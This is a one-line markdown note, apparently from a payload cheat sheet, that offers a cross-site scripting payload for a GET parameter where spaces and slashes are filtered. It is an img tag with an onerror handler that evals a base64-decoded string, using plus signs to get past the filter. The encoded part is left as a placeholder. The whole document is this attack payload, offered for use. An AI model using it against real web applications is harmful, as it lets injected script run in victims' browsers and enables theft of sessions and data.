# Arbitrary XSS in a GET parameter where no spaces or /'s were allowed
```
<img+src=x+onerror=eval(atob('BASE64ENCODED'))>
```
